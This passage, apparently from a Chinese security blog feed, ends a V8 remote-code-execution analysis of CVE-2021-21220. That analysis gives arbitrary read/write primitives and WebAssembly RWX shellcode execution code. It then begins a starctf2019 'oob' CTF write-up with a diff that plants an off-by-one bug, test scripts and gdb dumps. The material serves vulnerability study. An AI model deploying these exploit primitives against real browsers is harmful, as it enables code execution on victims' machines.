3.3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="（3）任意读写原语实现"><a href="#（3）任意读写原语实现" class="headerlink" title="（3）任意读写原语实现"></a>（3）任意读写原语实现</h5><p>相关代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var float_array_map = f2big(cor[3]);              </span><br><span class="line">var arr2 = [big2f(float_array_map), 1.2, 2.3, 3.4];         //创建伪造对象的数组</span><br><span class="line">var fake = fakeObject(addressOf(arr2) + 0x20n);             //通过fakeObject伪造对象</span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);               //创建伪造对象的数组，这里arr2[0] == fake_map, arr2[1] == arr2_length+elements_addr；2n &lt;&lt; 32n代表arr2的长度。大于等于2即可。</span><br><span class="line">    return (fake[0]);                                       //将addr2的内存构造为：前四字节为伪造的对象的长度，后四字节为要读取信息的地址。，fake[0]相当于那个修改任意地址的指针。</span><br><span class="line">&#125;function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    fake[0] = big2f(BigInt(val));                           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体相关的点都已经在代码注释中标注出来了，唯一需要注意的可能就是arr2[1]和fake[0]的换算关系如何得出，这个可以通过下面的内存状态尝试理解并编写相应的原语。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│  0x1fa7082aaea0 ◂— 0x804222d082439f1; arr_map</span><br><span class="line">01:0008│  0x1fa7082aaea8 ◂— 0x8082aaeb9    ; arr_length + arr_elements_addr</span><br><span class="line">02:0010│  0x1fa7082aaeb0 ◂— 0x8213bc5080455b9</span><br><span class="line">03:0018│  0x1fa7082aaeb8 ◂— 0x808042a95    ; arr_elements_map</span><br><span class="line">04:0020│  0x1fa7082aaec0 ◂— 0x804222d082439f1;fake_maparr2[0]</span><br><span class="line">05:0028│  0x1fa7082aaec8 ◂— 0x3ff3333333333333;fake_length + fake_element_addr  arr2[1]</span><br><span class="line">06:0030│  0x1fa7082aaed0 ◂— 0x4002666666666666</span><br><span class="line">07:0038│  0x1fa7082aaed8 ◂— 0x400b333333333333 (&#x27;333333\x0b@&#x27;)</span><br></pre></td></tr></table></figure><p>个人对上述的推理过程如下：</p><p>[0x28] == (2n &lt;&lt; 32n) + addr - 8n</p><p>arr2[1]  -&gt; [0x0+0x8]+0x8+0x8 -&gt; 0x18+0x8+0x8 -&gt; 0x28</p><p>fake[0] -&gt; [0x20+0x8]+0x8 -&gt;  (2n &lt;&lt; 32n) + addr - 8n+0x8 -&gt; (2n &lt;&lt; 32n) + addr</p><p>这样就可以通过操作fake[0]来进行任意地址读写。</p><h5 id="4-wasm利用"><a href="#4-wasm利用" class="headerlink" title="(4)wasm利用"></a>(4)wasm利用</h5><p>这里就是因为wasm会生成一块rwx空间，通过向该空间写入shellcode并调用达到命令执行的目的。</p><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addressOf(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = f2big(arbread(addressOf(wasmInstance) + <span class="number">0x68n</span>));                </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>最终复现如下</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210427231450948.png" alt="image-20210427231450948"></p><h3 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h3><p>issue 1196683</p><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞分析是个人的第一个Chrome的真实漏洞分析，所以过程会比较详细，但是详细不意味着面面俱到。我始终相信，二进制漏洞分析真实的调试一定是必不可少的，我想要表达的一些东西都存在于调试信息中了，自然就没有必要进行过多的文字陈述。</p><p>由于JIT优化机制的存在，出现类似于这种类型的漏洞一定还是存在的，但是这种漏洞是无法绕过沙箱的，所以用户开启沙箱使用浏览器可以在很大程度上防止恶意代码的攻击，但仍有一些漏洞是可以绕过沙箱对宿主机进行攻击，这就需要我们对不明链接保持谨慎的习惯，这样就可以很好的避免0day浏览器漏洞对我们的损害。</p><p>该文章的成型参考了很多篇优秀的文章[123]，感谢师傅们的开源精神，我也会将更多我的漏洞分析过程公开出来，为技术分享的氛围贡献一点绵薄之力。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1]. <a class="link"   href="https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ" >https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ<i class="fas fa-external-link-alt"></i></a></p><p>[2]. <a class="link"   href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day" >https://github.com/r4j0x00/exploits/tree/master/chrome-0day<i class="fas fa-external-link-alt"></i></a></p><p>[3]. <a class="link"   href="https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A" >https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A<i class="fas fa-external-link-alt"></i></a></p><p>[4]. <a class="link"   href="https://www.ecma-international.org/publications-and-standards/standards/ecma-262/" >https://www.ecma-international.org/publications-and-standards/standards/ecma-262/<i class="fas fa-external-link-alt"></i></a></p><p>[5]. <a class="link"   href="https://v8.dev/blog/elements-kinds" >https://v8.dev/blog/elements-kinds<i class="fas fa-external-link-alt"></i></a></p><p>[6]. <a class="link"   href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html" >https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html<i class="fas fa-external-link-alt"></i></a></p><p>[7]. <a class="link"   href="https://bugs.chromium.org/p/v8/issues/detail?id=6380" >https://bugs.chromium.org/p/v8/issues/detail?id=6380<i class="fas fa-external-link-alt"></i></a></p><p>[8]. <a class="link"   href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" >https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html<i class="fas fa-external-link-alt"></i></a></p><p>[9]. <a class="link"   href="https://v8.dev/blog/pointer-compression" >https://v8.dev/blog/pointer-compression<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;V8远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#V8远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;V8远程代码执行漏洞&quot;&gt;&lt;/a&gt;V8远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞信息&quot;&gt;&lt;a href=&quot;#一、漏洞信息&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>starctf2019-oob</title>
    <link href="https://fa1lr4in.github.io/2021/04/21/starctf2019-oob/"/>
    <id>https://fa1lr4in.github.io/2021/04/21/starctf2019-oob/</id>
    <published>2021-04-21T11:37:19.000Z</published>
    <updated>2021-04-21T11:37:34.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="starctf2019-oob"><a href="#starctf2019-oob" class="headerlink" title="starctf2019-oob"></a>starctf2019-oob</h1><h2 id="1、环境复现"><a href="#1、环境复现" class="headerlink" title="1、环境复现"></a>1、环境复现</h2><p>1、搭建v8调试环境，并下载题目到指定目录（这里需要有v8调试环境搭建的基础，要做好git全局代理和bash全局代理的准备）</p><p>2、还原题目环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598<span class="comment">#设置v8分支</span></span><br><span class="line">gclient sync</span><br><span class="line">git apply ../oob.diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><h2 id="2、diff分析"><a href="#2、diff分析" class="headerlink" title="2、diff分析"></a>2、diff分析</h2><p>diff文件如下，其中主要的逻辑在于kArrayOob的具体实现部分，我直接在该段代码中将重要位置进行注释</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();    //指定参数个数大于1的时候返回   </span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);   //将receiver对象强转成array对象</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());//elements为array对象的elements字段</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());//数组长度</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));//当参数为空，返回第length个元素的内容</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number()); //当参数为个数为1，就将第一个参数写入到数组中的第length个元素的值</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于创建一个数组长度为length时我们可以访问的是第0到length-1个元素，但是该段代码却直接读取和写入第length个元素，这样就造成了off-by-one。</p><p>验证一下，实际上也和我们的分析是一样的</p><p><img src="/2021/04/21/starctf2019-oob/image-20201230164453695.png" alt="image-20201230164453695"></p><h2 id="3、分析利用思路"><a href="#3、分析利用思路" class="headerlink" title="3、分析利用思路"></a>3、分析利用思路</h2><p>首先编写test.js如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, <span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> data = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return data:&quot;</span> + data.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>调试到第一步会给出数组a的object的基址，查看相关job，telescope</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gdb d8</span><br><span class="line">set args --allow-natives-syntax test_jscode/test.js</span><br><span class="line">r</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de49</span></span><br><span class="line"><span class="number">0xf264d68de49</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3e88cd582ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1cf103951111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line"> - properties: <span class="number">0x0f553c540c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x01ac3ca801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span> <span class="comment">//map, 注意到这个时候0xf264d68de48位置的值是0x3e88cd582ed9</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span><span class="comment">//protype</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span><span class="comment">//elements, 在该object-0x30的位置上</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span>   <span class="comment">//length</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> ◂— <span class="number">0x0</span>  <span class="comment">//properties</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span><span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span><span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span><span class="comment">//1.1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试到第二步，打印到了0xf264d68de48位置处的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob <span class="keyword">return</span> data:<span class="number">3.3970610731499e-310</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>调试到第三步，对0xf264d68de48进行了写入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span 